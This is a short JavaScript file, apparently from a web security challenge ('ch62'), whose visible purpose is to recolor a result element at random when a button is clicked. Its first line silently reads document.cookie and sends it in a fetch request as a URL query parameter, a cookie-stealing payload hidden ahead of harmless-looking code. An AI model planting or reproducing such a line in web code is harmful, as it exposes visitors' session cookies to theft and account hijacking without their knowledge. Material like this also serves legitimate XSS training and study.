fetch("/web-client/ch62/color.js?c="+encodeURIComponent(document.cookie));
const color = document.getElementById("color");
const target = document.getElementById("result");
function getRandomInt(max) {
    return Math.floor(Math.random() * max);
  }  

color.onclick = () => {
    target.style.color = `rgb(${getRandomInt(255)}, ${getRandomInt(255)}, ${getRandomInt(255)})`;
}
